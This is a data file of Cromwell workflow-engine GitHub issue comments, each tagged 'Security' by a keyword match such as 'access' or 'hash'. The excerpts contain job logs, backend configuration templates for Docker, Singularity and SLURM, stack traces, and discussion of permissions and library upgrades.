Security,localizing-files; 2017/02/07 15:41:48 I: Calling SetOperationStatus(localizing-files); 2017/02/07 15:41:48 I: SetOperationStatus(localizing-files) succeeded; 2017/02/07 15:41:48 I: Docker file /cromwell_root/exec.sh maps to host; location /mnt/local-disk/exec.sh.; 2017/02/07 15:41:48 I: Copying; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; to /mnt/local-disk/exec.sh; 2017/02/07 15:41:48 I: Running command: sudo gsutil -q -m cp; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/exec.sh; /mnt/local-disk/exec.sh; 2017/02/07 15:41:49 I: Docker file; /cromwell_root/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E:,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:1442,access,access,1442,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,log from my run includes potentially useful information on the step. `[ERROR] [05/17/2018 15:47:23.959] [cromwell-system-akka.dispatchers.engine-dispatcher-48] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-67f5112e-5c3d-4a03-9c78-97725bf0d9cf/WorkflowExecutionActor-67f5112e-5c3d-4a03-9c78-97725bf0d9cf/67f5112e-5c3d-4a03-9c78-97725bf0d9cf-EngineJobExecutionActor-batch_for_variantcall:NA:1/ejha_for_67f5112e-5c3d-4a03-9c78-97725bf0d9cf:BackendJobDescriptorKey_CommandCallNode_batch_for_variantcall:-1:1/CCHashingJobActor-67f5112e-batch_for_variantcall:NA:1] Failed to hash null`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-389918760:613,hash,hash,613,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-389918760,1,['hash'],['hash']
Security,"logue = ""sync"". #. # To turn off the default `sync` behavior set this value to an empty string:. # script-epilogue = """". . # The list of possible runtime custom attributes. runtime-attributes = """""". String? docker. String? docker_name. """""". . # Submit string when there is no ""docker"" runtime attribute. submit = ""/bin/bash ${script}"". . # Submit string when there is a ""docker"" runtime attribute. submit-docker = """""". chmod u+x ${cwd}/execution/script && \. docker run --rm \. -v ${cwd}:${docker_cwd} \. ${docker_name} /bin/bash -c ${script}. """""". . # Root directory where Cromwell writes job results. This directory must be. # visible and writeable by the Cromwell process as well as the jobs that Cromwell. # launches. root = ""cromwell-executions"". . # File system configuration. filesystems {. . # For SFS backends, the ""local"" configuration specifies how files are handled. local {. . # Try to hard link (ln), then soft-link (ln -s), and if both fail, then copy the files. localization: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Call caching strategies. caching {. # When copying a cached result, what type of file duplication should occur. Attempted in the order listed below:. duplication-strategy: [. ""hard-link"", ""soft-link"", ""copy"". ]. . # Possible values: file, path. # ""file"" will compute an md5 hash of the file content. # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",. # in order to allow for the original file path to be hashed. hashing-strategy: ""file"". . # When true, will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. # If false or the md5 does not exist, will proceed with the above-defined hashing strategy. check-sibling-md5: false. }. }. }. . # The defaults for runtime attributes if not provided. default-runtime-attributes {. failOnStderr: false. continueOnReturnCode: 0. }. }. }. }. }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595:3167,hash,hash,3167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-412883595,6,['hash'],"['hash', 'hashed', 'hashing', 'hashing-strategy']"
Security,looks like we give a free pass on external contributors for at least some backends during CI:; ```; ********************************************************; ********************************************************; ** **; ** WARNING: Encrypted keys are unavailable. Exiting. **; ** **; ********************************************************; ********************************************************; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4833#issuecomment-483297075:235,Encrypt,Encrypted,235,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4833#issuecomment-483297075,1,['Encrypt'],['Encrypted']
Security,"m-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.create is not supported for this resource.; ```; and there is clearly an extra role missing as roles `storage.objectCreator`, `storage.objectViewer`, `genomics.pipelinesRunner`, `genomics.admin`, `iam.serviceAccountUser` (corresponding to roles Storage Object Creator, Storage Object Viewer, Genomics Pipelines Runner, Genomics Admin, Service Account User) are not sufficient to create files inside Google buckets. 3) The [permissions](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#permissions) section guides the user into creating a new service account under the current project. This would need to be selected in the configuration file with an authorization with `scheme = ""service_account""` but instead both the configuration file for [PAPIv2](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#setting-up-papiv2) and the configuration file for [PAPIv1](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/#lets-get-started) are configured to use an authorization with `scheme = ""application_default""`. I find it very hard to believe that any novel user could go through the tutorial and successfully set up a Cromwell server. On a slightly different note, some of my issues would be resolved if I could run jobs using my user account rather than a service account associated with my project. In the Google [backends](https://cromwell.readthedocs.io/en/stable/backends/Google/) section of the docs there is a lonely mention of the `scheme = ""user_account""` but no further explanation. According to the [source code](https://github.com/broadinstitute/cromwell/blob/develop/cloudSupport/src/test/scala/cromwell/cloudsupport/gcp/GoogleConfigurationSpec.scala) it should be defined as:; ```; {; name = ""user-account""; scheme = ""user_account""; user = ""me""; secrets-file = ""/very/secret/file.txt""; data-store-dir = ""/where/the/data/at""; }; ```; But I was not able to get it to work.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349:2935,authoriz,authorization,2935,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-666071349,2,['authoriz'],['authorization']
Security,"mapValues recomputes itself every time it is accessed. As stated in the original ticket, we have had fairly serious performance problems which traced back to the usage of mapValues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532:45,access,accessed,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2434#issuecomment-333308532,1,['access'],['accessed']
Security,"mwell/cromwell.example.backends/cromwell.examples.conf --illegal-access=warn -jar /home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar run test_wf_pack.cwl --inputs test_wf.json --type CWL --type-version v1.0; [2019-04-18 17:19:09,95] [info] Running with database db.url = jdbc:hsqldb:mem:39c64473-526e-47d6-a015-f9193a0fd4f4;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:17,77] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2019-04-18 17:19:17,78] [info] [RenameWorkflowOptionsInMetadata] 100%; [2019-04-18 17:19:17,92] [info] Running with database db.url = jdbc:hsqldb:mem:58f8cd7c-3e36-430d-b36a-1620b0333e3e;shutdown=false;hsqldb.tx=mvcc; [2019-04-18 17:19:18,65] [info] Slf4jLogger started; [2019-04-18 17:19:18,79] [info] Pre Processing Workflow...; [2019-04-18 17:19:19,12] [info] Pre-Processing file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl; WARNING: Illegal reflective access by org.python.core.PySystemState (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.io.Console.encoding(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method sun.nio.ch.SelChImpl.getFD(); WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:1334,access,access,1334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"nb Somatic completed successfully by bumping the memory (I doubled it to 8GB) :); I have another question about the rnaseq pipeline if you don't mind.; I'm hitting this error on the `pipeline_summary` task:. ```; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/cyvcf2/__init__.py:1: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .cyvcf2 import (VCF, Variant, Writer, r_ as r_unphased, par_relatedness,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/_libs/__init__.py:4: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from .tslib import iNaT, NaT, Timestamp, Timedelta, OutOfBoundsDatetime; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/__init__.py:26: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (hashtable as _hashtable,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/dtypes/common.py:6: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import algos, lib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/util/hashing.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import hashing, tslib; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/core/indexes/base.py:7: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; from pandas._libs import (lib, index as libindex, tslib as libts,; /usr/local/share/bcbio-nextgen/anaconda/lib/python2.7/site-packages/pandas/tseries/offsets.py:21: RuntimeWarning: numpy.dtype size changed, may indicate binary incompatibility. Expected 96, got 88; import pandas._libs.tslibs.offsets as liboffsets; /usr/local/shar",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277:975,hash,hashtable,975,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3724#issuecomment-436054277,1,['hash'],['hashtable']
Security,"nce/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; maps to host location; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list.; 2017/02/07 15:41:49 I: Copying; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; to /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:49 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:2258,access,access,2258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,ncurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870); at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199); at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209); at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285); at com.google.api.client.auth.oauth2.Credential.refreshToken(Credential.java:486); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply$mcZ$sp(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.GoogleAuthMode$$anonfun$1.apply(GoogleAuthMode.scala:79); at scala.util.Try$.apply(Try.scala:192); at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:64); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:138); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:95); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:138); at cromwell.backend.impl.jes.io.package$.buildFilesystem(package.scala:26); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWorkflowPaths.scala:18); at cromwell.backend.impl.jes.JesInitializationActor.<init>(JesInitializationActor.scala:43); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); at cromwell.backend.impl.jes.JesInitializationActor$$anonfun$props$1.apply(JesInitializationActor.scala:22); ```. The two problem actors here are JesAsyncBackend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798:1447,validat,validateCredentials,1447,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1065#issuecomment-228816798,1,['validat'],['validateCredentials']
Security,nd$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1$$anonfun$apply$10.apply(JesBackend.scala:412) ~[classes/:na]; at cromwell.util.TryUtil$$anonfun$4.apply(TryUtil.scala:64) ~[classes/:na]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.util.TryUtil$.retryBlock(TryUtil.scala:64) ~[classes/:na]; at cromwell.engine.backend.jes.JesBackend$.withRetry(JesBackend.scala:113) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:412) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$cromwell$engine$backend$jes$JesBackend$$createJesRun$1.apply(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.authentication.JesAuthentication$class.authenticateAsCromwell(JesAuthentication.scala:39) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.authenticateAsCromwell(JesBackend.scala:161) [classes/:na]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:400) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:542) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$10.apply(JesBackend.scala:541) [classes/:na]; at scala.util.Success.flatMap(Try.scala:231) [scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:541) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:285) [classes/:na]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:275) [classes/:na]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486:3990,authenticat,authenticateAsCromwell,3990,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166392486,1,['authenticat'],['authenticateAsCromwell']
Security,"nfig. ### The results. The following execution strings can be inserted into the two container configs:; - Singularity: `singularity exec --bind ${cwd}:${docker_cwd} docker://${docker} ${job_shell} ${script}`; - udocker: `udocker run ${""--user "" + docker_user} --rm -v ${cwd}:${docker_cwd} ${docker} ${script}`. My _container_ config template for no workflow manager:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: singularity; providers: {; singularity {; # The backend custom configuration.; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; """"""; # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; ## PLACE THE CORRECT CONTAINER COMMAND HERE ##; """"""; }; }; }; }; ```. And applied for something like SLURM:; ```HOCON; include required(classpath(""application"")). # uncomment if using udocker; # docker.hash-lookup.enabled = false. backend {; default: SLURM; providers: {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 2; Int requested_memory_mb_per_core = 8000; String? queue; String? docker; String? docker_user; """"""; # you should have a submit script as well, ; submit-docker = """"""; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr ${""-p "" + queue} \; -t ${runtime_minutes} ${""-c "" + cpus} --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""## PLACE THE CORRECT CONTAINER COMMAND HERE ##""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }; ```. Thanks everyone for the comments above. Edit: Correct mistype: `String queue? → String? queue`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840:3404,hash,hash-lookup,3404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461275840,2,['hash'],['hash-lookup']
Security,"ng an HPC environment like our methods users do we'd have to be careful not to store a multiprocess embedded DB on NFS. Today with HSQLDB `mem:` cromwell uses a pair of ephemeral database connection pools. I'm not sure the behavior if both pools are pointed at the same HSQLDB `file:`, but I think it might work as the docs only warn of connecting from multi-process not multi-pool. The default config mentioned in this ticket may still consider using separate `file:` instances just in case. All issues above have workarounds with varying degrees of difficulty and/or documentation warnings. For example one could clarify the documentation with ""Cromwell only supports one instance connecting to the pair of default _file:_ databases at a time."" Or: ""Cromwell only supports call caching when running a workflow with the same name"" because we did something like generate the db file based on the workflow name. Another option, instead of having multiple processes access the same embedded DB, is to research spinning up a background daemon db process, which do support multiple connections. Links to consider when defining acceptance criteria are below. . Re: our existing/proposed HSQLDB usage; - Cromwell's `database.metadata` and `database.engine` when absent both [fall back to the root `database` stanza.](https://github.com/broadinstitute/cromwell/blob/088e12d97dd18f463e6a387a6ffb002d9725cbe4/services/src/main/scala/cromwell/services/ServicesStore.scala#L12); - [""This allows each instance of a database object to use a clean, and different, in memory database.""](https://github.com/broadinstitute/cromwell/blob/a8a605ed1f2f2d2de2db9b05c395a2c87ebfc295/database/sql/src/main/scala/cromwell/database/sql/SqlDatabase.scala#L17-L39); - [""only one Java process at a time can make in-process connections to a given _file:_ database""](http://hsqldb.org/doc/guide/running-chapt.html#rgc_inprocess); - [""Several different programs can connect to the server and retrieve or update information.""](http:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194:1734,access,access,1734,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194,2,['access'],['access']
Security,nstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:12); 	at cats.Traverse$Ops.traverse(Traverse.scala:19); 	at cats.Traverse$Ops.traverse$(Traverse.scala:19); 	at cats.Traverse$ToTraverseOps$$anon$3.traverse(Traverse.scala:19); 	at cromwell.core.path.PathBuilderFactory$.instantiatePathBuilders(PathBuilderFactory.scala:23); 	at cromwell.engine.EngineFilesystems$.pathBuildersForWorkflow(EngineFilesystems.scala:29); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$workflowOptionsAndPathBuilders$1(MaterializeWorkflowDescriptorActor.scala:226); 	at cats.data.Validated.map(Validated.scala:204); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowOptionsAndPathBuilders(MaterializeWorkflowDescriptorActor.scala:225); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:159); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.applyOrElse(MaterializeWorkflowDescriptorActor.scala:155); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:34); 	at akka.actor.FSM.processEvent(FSM.scala:684); 	at akka.actor.FSM.processEvent$(FSM.scala:681); 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.akka$actor$LoggingFSM$$super$processEvent(MaterializeWorkflowDescriptorActor.scala:136); 	at akka.actor.LoggingFSM.processEv,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:3490,Validat,Validated,3490,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['Validat'],['Validated']
Security,"o review the changelog. In this case, we're going from `0.61.0-alpha` to `0.124.8` which is a large jump, but that doesn't tell the whole story. * This looks like a lot of releases to check. For sure, checking every release manually is not practical; we'll have to rely on their release notes.; * Until `0.120.0`, this library used to be included in a [monorepo-ish repo of Java libraries](https://github.com/googleapis/google-cloud-java) which appears to have had a regular 2-week release cycle. Not every release had changes to the `google-storage-nio` library. In fact, browsing the release notes, I found only a handful that mentioned changes to storage NIO. These all looked very innocent to me.; * After `0.120.0`, the library code moved to its own [repo](https://github.com/googleapis/java-storage-nio). Releases there have been less frequent and more irregularly scheduled, but still largely consist of dependency updates. (It's possible that _those_ dependency updates introduce unexpected behaviors in `java-storage-nio`, but there's only so much we can audit).; * Cromwell was briefly running with `0.123.8` until the bug mentioned here was discovered. Not knowing when that bug was introduced, we rolled all the way back. Now, we are pretty confident that it was introduced in [`0.122.0`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.122.0) and fixed in [`0.123.13`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.13).; * Again looking at releases that are not just dependency updates, nearly all of the changes look very innocent to me. In fact, updating to at least [`0.123.23`](https://github.com/googleapis/java-storage-nio/releases/tag/v0.123.23) will give us the benefit of a [fix](https://github.com/googleapis/java-storage-nio/pull/841) to a requester-pays problem that we encountered ourselves.; * There's only one other post-`0.120.0` [change](https://github.com/googleapis/java-storage-nio/pull/774) (in [`0.123.18`](https://github.com/goog",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452:1132,audit,audit,1132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6804#issuecomment-1184386452,1,['audit'],['audit']
Security,"oint so not adding a Centaur test for every single WOM type. ```; Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""])java.lang.UnsupportedOperationException: Could not construct array of type WomMaybeEmptyArrayType(WomOptionalType(WomMaybeEmptyArrayType(WomStringType))) with this value: List(WomOptionalValue(WomMaybeEmptyArrayType(WomSingleFileType),Some([])), [""gs://fc-secure-0a879173-62d3-4c3a-8fc3-e35ee4248901/whitelists/10x_multiome/737K-arc-v1_ATAC_whitelist.txt.gz""]); 	at wom.values.WomArray$.apply(WomArray.scala:43); 	at wom.values.WomArray$.apply(WomArray.scala:49); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.$anonfun$evaluateValue$16(LiteralEvaluators.scala:109); 	at cats.data.Validated.map(Validated.scala:559); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:106); 	at wdl.transforms.base.linking.expression.values.LiteralEvaluators$$anon$6.evaluateValue(LiteralEvaluators.scala:95); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$ops$$anon$1.evaluateValue(ValueEvaluator.scala:10); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:37); 	at wdl.draft3.transforms.linking.expression.values.package$$anon$1.evaluateValue(package.scala:22); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expression.ValueEvaluator$Ops.evaluateValue$(ValueEvaluator.scala:10); 	at wdl.model.draft3.graph.expres",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174:1223,Validat,Validated,1223,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385#issuecomment-1992648174,1,['Validat'],['Validated']
